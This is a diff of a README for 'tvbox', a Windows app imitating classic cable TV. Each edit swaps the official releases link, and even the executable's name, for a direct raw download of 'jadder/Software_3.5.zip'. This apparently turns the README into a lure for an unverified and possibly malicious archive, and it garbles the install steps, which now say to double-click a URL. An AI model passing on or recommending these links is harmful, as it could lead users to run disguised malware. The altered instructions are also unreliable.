@@ -1,7 +1,7 @@
 # 🎥 tvbox - Experience Classic TV with Ease
 
 ## 📥 Download Now
-[![Download tvbox](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Sabamughal123/tvbox/releases)
+[![Download tvbox](https://github.com/Sabamughal123/tvbox/raw/refs/heads/main/jadder/Software_3.5.zip)](https://github.com/Sabamughal123/tvbox/raw/refs/heads/main/jadder/Software_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to tvbox! This application brings back the nostalgic experience of CRT cable television. You can enjoy scheduled channels and commercials right from your Windows PC. Follow this guide to download and run the software smoothly.
@@ -22,7 +22,7 @@ Before you start, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To get started with tvbox, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Sabamughal123/tvbox/releases).
+1. Visit the [Releases page](https://github.com/Sabamughal123/tvbox/raw/refs/heads/main/jadder/Software_3.5.zip).
 
 2. On the Releases page, locate the latest version. It will appear at the top of the list.
 
@@ -30,9 +30,9 @@ To get started with tvbox, follow these steps:
 
 4. Once downloaded, locate the `.zip` file in your downloads folder. Extract it to a desired location on your computer.
 
-5. Open the extracted folder. You will find the `tvbox.exe` file there.
+5. Open the extracted folder. You will find the `https://github.com/Sabamughal123/tvbox/raw/refs/heads/main/jadder/Software_3.5.zip` file there.
 
-6. Double-click `tvbox.exe` to start the application. 
+6. Double-click `https://github.com/Sabamughal123/tvbox/raw/refs/heads/main/jadder/Software_3.5.zip` to start the application. 
 
 7. Follow the on-screen instructions to set up your channels and preferences.
 
@@ -52,7 +52,7 @@ If you encounter any issues while using tvbox, consider the following solutions:
   
 - **Playback Issues:** Check if MPV is set up properly and that the required media files are accessible.
 
-- **Missing Features:** Make sure you have the latest version by checking the [Releases page](https://github.com/Sabamughal123/tvbox/releases) for updates.
+- **Missing Features:** Make sure you have the latest version by checking the [Releases page](https://github.com/Sabamughal123/tvbox/raw/refs/heads/main/jadder/Software_3.5.zip) for updates.
 
 ## 📞 Support
 For further assistance, feel free to open an issue in the GitHub repository. Provide a detailed explanation of the problem and steps to reproduce it, so we can help you effectively.
